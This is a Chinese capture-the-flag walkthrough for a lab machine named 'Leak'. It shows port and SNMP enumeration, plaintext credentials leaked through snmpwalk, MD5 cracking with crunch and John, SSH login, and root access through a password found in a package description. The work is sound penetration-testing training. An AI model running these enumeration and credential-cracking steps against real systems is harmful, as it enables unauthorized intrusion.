## 靶机信息

- **IP 地址:** `192.168.205.161`
- **攻击机:** `192.168.205.128`

---

## 一、信息收集与服务枚举

首先，对目标主机进行全端口 TCP 扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.161                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 05:49 EDT
Nmap scan report for 192.168.205.161
Host is up (0.00019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:86:21:F9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.39 seconds
```

扫描结果显示，目标开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。

接着，访问 80 端口的 Web 服务，发现是一个模仿 Kali Linux 终端的静态页面，未发现直接可利用的功能。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.161       
<!DOCTYPE html>
<html lang="en">
...
```

使用 `dirsearch` 和 `gobuster` 对网站目录进行扫描，未发现除主页外的其他有用路径。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://192.168.205.161               
...
Task Completed
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ gobuster dir -u 192.168.205.161 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
...
/index.html           (Status: 200) [Size: 15740]
...
```

由于 TCP 扫描未发现明显突破口，接下来对目标进行 UDP 扫描，寻找其他可能的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -sU --top-port 100 192.168.205.161
...
PORT    STATE SERVICE
161/udp open  snmp
...
```

UDP 扫描发现 **161 (SNMP)** 端口开放，这是一个关键发现。SNMP 服务常因配置不当而泄露大量敏感信息。

## 二、SNMP 信息泄露与漏洞利用

尝试使用默认的 community string `public` 来读取 SNMP 信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ snmpwalk -v2c -c public 192.168.205.161
...
```

`snmpwalk` 返回了海量信息。为了快速定位有用数据，使用 `grep` 过滤包含 `pass` 的行。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ snmpwalk -v2c -c public 192.168.205.161|grep "pass"
iso.3.6.1.2.1.25.4.2.1.4.331 = STRING: "leak-service --login Shinozaki --pass ShinozakiAi"
iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: "base-passwd_3.5.46_amd64"
iso.3.6.1.2.1.25.6.3.1.2.480 = STRING: "passwd_1:4.5-1.1_amd64"
```

在系统进程信息中发现了一个惊人的信息泄露：一个名为 `leak-service` 的服务启动时，以明文形式传递了登录凭证 `Shinozaki:ShinozakiAi`。

同时，在 `snmpwalk` 的输出中还发现了域名信息 `admin@sunset.leak.dsz`。将 `leak.dsz` 和 `sunset.leak.dsz` 添加到本地 `/etc/hosts` 文件中，以便后续测试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo vim /etc/hosts             
...
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 /etc/hosts                                    
192.168.205.161 leak.dsz sunset.leak.dsz
```

再次对新发现的域名进行目录扫描，`sunset.leak.dsz` 域名下发现了一个 `/manager` 路径，访问后需要认证。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -u http://sunset.leak.dsz 
...
[05:56:17] 301 -  320B  - /manager  ->  http://sunset.leak.dsz/manager/
[05:56:17] 401 -   24B  - /manager/
...
```

是一个登录窗口。使用前面泄露的凭证 `Shinozaki:ShinozakiAi` 尝试登录，成功进入后台。在后台页面中，发现了ssh用户 `ai` 的密码 MD5 哈希。

![image-20250701180035946](https://7r1umphk.github.io/image/20250701180036271.webp)

- **用户:** `ai`
- **MD5 Hash:** `d21715210cb6224f9ff4c075a8906fe9`

## 三、获取初始访问权限

现在，我们需要破解这个 MD5 哈希。根据页面提示，使用 `crunch` 生成一个以 `baba` 开头的8位密码字典。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ crunch 8 8 -t baba@@@@ -o wordlist.txt
...
```

将哈希保存到文件 `hash` 中，并使用 `John the Ripper` 和刚生成的字典进行破解。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat hash                              
ai:d21715210cb6224f9ff4c075a8906fe9
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --format=raw-md5 --wordlist=wordlist.txt hash
...
babadawo         (ai)     
...
Session completed. 
```

成功破解密码为 `babadawo`。

使用获取到的凭证 `ai:babadawo` 尝试 SSH 登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh ai@192.168.205.161
ai@192.168.205.161's password: 
...
Last login: Tue Jul  1 05:13:09 2025 from 192.168.205.128
ai@Leak:~$
```

登录成功！现在获取 `user.txt`。

```bash
ai@Leak:~$ cat user.txt 
flag{user-13421fec-559d-11f0-a1af-5f1558743b4d}
```

成功拿到用户 flag。

## 四、权限提升

为了提升权限，首先查看当前系统上安装的软件包，特别是寻找非标准的或自定义的包。

```bash
ai@Leak:~$ dpkg -l |grep "leak"
ii  leak-date                     1.0-1                                       amd64        Simple date and time display utility
ii  liblsan0:amd64                10.2.1-6                                    amd64        LeakSanitizer -- a memory leak detector (runtime)
```

发现一个名为 `leak-date` 的可疑软件包。查看其详细信息。

```bash
ai@Leak:~$ dpkg -s leak-date
Package: leak-date
Status: install ok installed
Priority: optional
Section: utils
Installed-Size: 500
Maintainer: Security Admin <admin@leak.dsz>
Architecture: amd64
Version: 1.0-1
Description: Simple date and time display utility
 This package provides a minimal CLI utility to display
 the current system date and time. Ideal for scripts and
 system monitoring. SECURITY NOTICE: System debug token
 IMKCFRunLoopWakeUpReliable for root access.
```

在软件包的描述信息中，发现了一条至关重要的安全提示：`SECURITY NOTICE: System debug token IMKCFRunLoopWakeUpReliable for root access.`。这串字符 `IMKCFRunLoopWakeUpReliable` 极有可能就是 root 用户的密码。

使用 `su -` 切换到 root 用户，并输入这串字符作为密码。

```bash
ai@Leak:~$ su - 
Password: 
root@Leak:~#
```

成功切换到 root 用户！现在读取最终的 root flag。

```bash
root@Leak:~# cat /root/root.txt 
flag{root-357d3d08-5598-11f0-a27e-639fd7e7110b}
```